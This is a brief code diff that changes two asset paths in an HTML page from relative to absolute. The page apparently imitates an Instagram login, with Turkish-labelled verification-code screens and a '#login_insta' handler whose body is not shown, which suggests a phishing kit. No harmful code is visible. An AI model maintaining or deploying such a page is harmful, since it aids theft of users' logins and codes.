@@ -17,7 +17,7 @@
             display : none;
         }
     </style>
-    <link rel="stylesheet" href="assets/style/instastyle.css?v=2.4"/>
+    <link rel="stylesheet" href="/assets/style/instastyle.css?v=2.4"/>
 </head>
 <body>
       <span id="react-root">
@@ -149,7 +149,7 @@
       </style>
       <div class="onay_kodu_ekrani"></div>
       <div class="onay_kodu_girme_ekrani"></div>
-      <script src="assets/jquery/2.2.4/jquery.min.js"></script>
+      <script src="/assets/jquery/2.2.4/jquery.min.js"></script>
       <script src='https://www.google.com/recaptcha/api.js'></script>
       <script>
           $('#login_insta').click(function() {
